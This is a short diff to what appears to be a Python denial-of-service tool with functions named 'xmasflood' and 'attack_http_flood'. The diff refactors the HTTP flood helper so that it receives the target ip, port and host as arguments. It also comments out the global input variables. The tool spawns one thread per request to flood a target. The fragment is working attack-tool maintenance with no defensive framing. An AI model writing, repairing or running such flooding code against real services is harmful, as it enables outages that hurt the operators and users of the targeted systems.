@@ -204,14 +204,14 @@ def xmasflood(target_url, targetPort, cycle):
 
 
 
-# Parse inputs
-host = ""
-ip = ""
-port = 0
-num_requests = 0
-
-# Create a shared variable for thread counts
-thread_num = 0
+# # Parse inputs
+# host = ""
+# ip = ""
+# port = 0
+# num_requests = 0
+#
+# # Create a shared variable for thread counts
+# thread_num = 0
 thread_num_mutex = threading.Lock()
 
 
@@ -229,7 +229,7 @@ def attack_http_flood(target, target_port, num_of_requests):
     # Spawn a thread per request
     all_threads = []
     for i in range(num_requests):
-        t1 = threading.Thread(target=attack_http_flood_helper)
+        t1 = threading.Thread(target=attack_http_flood_helper, args=(ip,port,host))
         t1.start()
         all_threads.append(t1)
 
@@ -260,7 +260,7 @@ def generate_url_path():
 
 
 # Perform the request
-def attack_http_flood_helper():
+def attack_http_flood_helper(ip,port,host):
     print_status()
     url_path = generate_url_path()
 
